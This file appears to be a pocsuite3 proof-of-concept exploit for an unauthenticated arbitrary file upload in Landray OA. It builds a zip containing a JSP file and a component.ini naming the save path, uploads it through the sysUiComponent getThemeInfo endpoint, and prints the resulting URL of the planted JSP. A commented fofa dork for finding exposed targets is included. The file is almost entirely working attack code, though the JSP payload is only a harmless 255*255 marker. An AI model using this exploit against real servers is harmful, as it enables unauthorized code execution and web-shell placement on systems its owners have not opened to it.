import zipfile
from pocsuite3.api import requests, POCBase, Output, register_poc, logger, OptString, VUL_TYPE, POC_CATEGORY
# from pocsuite3.lib.utils import random_str

class TestPOC(POCBase):
    vulID = '0'  
    version = '1.0' 
    author = 'Douglas'  
    vulDate = '2023-11-12' 
    createDate = '2023-11-12'
    updateDate = '2023-11-12'
    references = ['https://mp.weixin.qq.com/s/HsjgUY183BGB5qMnD1ArOw']
    name = '蓝凌OA sysUiComponent 任意文件上传'
    appName = '蓝凌OA'
    appPowerLink = 'https://www.landray.com.cn' 
    appVersion = ''
    vulType = VUL_TYPE.UPLOAD_FILES
    category = POC_CATEGORY.EXPLOITS.WEBAPP
    desc = '''
    蓝凌OA sysUiComponent 前台任意文件上传
    '''
    # dork = {'hunter': ''}
    # dork = {'fofa': 'app="Landray-OA系统"'}
    pocDesc = '''poc usage'''
    samples = ['']
    install_requires = ['']

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
    
    def createfiles(self):
        '''
        创建一个test.jsp和compoenent.ini文件，其中component.ini里面的id是保存到网站的文件夹，name是保存到网站的文件名
        将这个文件压缩成一个zip文件
        '''
        text = "<% out.println(255*255);%>"
        with open("test.jsp", "w") as f:
            f.writelines(text)
        f.close()

        with open("component.ini", 'w+') as f:
            f.write("id=2023" + "\n")
            f.write("name=test.jsp" + "\n")
        f.close()

        with zipfile.ZipFile("test.zip", 'w', zipfile.ZIP_DEFLATED) as f:
            f.write("component.ini", "component.ini")
            f.write("test.jsp", "test.jsp")
        f.close()

    def _verify(self):
        '''verify mode'''
        result = {}
        payload = "/sys/ui/sys_ui_component/sysUiComponent.do?method=upload"
        target = self.url + payload

        try:
            r = requests.get(url=target, timeout=15, verify=False, allow_redirects=False)
            # print(r.status_code)
            # print(r.text)
            if r.status_code == 200:
                # print(r.text)
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = target
                result['VerifyInfo']['Payload'] = payload
        except Exception as ex:
            logger.error(str(ex))

        return self.parse_output(result)

    def _attack(self):
        ''' attack mode '''
        result = {}
        # 创建压缩文件
        self.createfiles()
        host = self.rhost
        port = self.rport
        rhost = host + ":" + str(port)
        headers = {
            "Host": rhost,
            "Accept-Encoding": "gzip, deflate",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0",
            "Accept-Language": "en;q=0.8,en-GB;q=0.7,en-US;q=0.6",
            "Accept": "*/*",
            "Referer": self.url + "/sys/ui/sys_ui_component/sysUiComponent.do?method=upload",
            "Origin": self.url,
            "Connection": "close",
        }
        payload = "/sys/ui/sys_ui_component/sysUiComponent.do?method=getThemeInfo"
        target = self.url + payload

        files = {
            "file": ("test.zip", open('test.zip', 'rb'), "application/zip")
        }


        try:
            r = requests.post(url=target, timeout=15, verify=False, allow_redirects=False, headers=headers, files=files)
            # print(r.status_code)
            # print(r.text)
            if r.status_code == 200 and "directoryPath" in r.text:
                # print(r.text)
                shellpath = self.url + "/resource/ui-component/2023/test.jsp"
                print(shellpath)
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = target
                result['VerifyInfo']['Payload'] = payload
        except Exception as ex:
            logger.error(str(ex))

        return self.parse_output(result)

register_poc(TestPOC)